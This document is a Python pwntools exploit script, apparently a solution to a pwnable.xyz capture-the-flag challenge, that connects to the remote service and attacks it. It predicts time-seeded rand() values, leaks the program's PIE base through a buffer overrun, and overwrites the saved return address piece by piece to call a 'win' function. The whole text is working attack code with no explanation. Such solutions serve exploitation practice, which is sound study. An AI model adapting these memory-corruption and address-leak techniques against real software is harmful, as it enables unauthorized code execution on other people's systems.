from pwn import *
from ctypes import *

r = remote("svc.pwnable.xyz", 30014)

sla = r.sendlineafter
sa = r.sendafter


def Init(data):
    sla(b"> ", b"1")
    sla(b"data: ", data)


def Append(data, zero=False):
    sla(b"> ", b"2")
    if not zero:
        sa(b"chars: ", data)


def Print():
    sla(b"> ", b"3")


# generate random values

libc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(libc.time((0)))

randValues = []
randSum = 0

while randSum <= 0x388:
    randValue = libc.rand() % 0x10
    randValues.append(randValue)
    randSum += randValue


# leak pie

Init(b"A" * (0x408 - randSum))

leaked = False  # true if PIE is leaked

for randValue in randValues:
    if randValue >= 14 and not leaked:
        sla(b"> ", b"2")
        sa(b"chars: ", b"A" * 8)

        Print()

        r.recvline()
        pie = u64(r.recvline()[-7:-1].ljust(8, b"\x00")) - 0xBC2  # pie base
        log.info("pie base: " + hex(pie))

        leaked = True
    elif randValue == 0:
        Append(b"A" * randValue, True)
    else:
        Append(b"A" * randValue)


# overwrite return address

win = pie + 0xB57
overwritten = 0  # overwritten bytes in return address

while overwritten < 6:
    sla(b"> ", b"2")

    r.recvuntil(b"Give me ")
    chars = int(r.recvuntil(b" ")[:-1])

    if overwritten + chars > 8:
        sa(b"chars: ", p64(win)[overwritten:])
    else:
        sa(b"chars: ", p64(win)[overwritten : overwritten + chars])

    overwritten += chars

sla(b"> ", b"0")  # return main() => call win()


r.interactive()
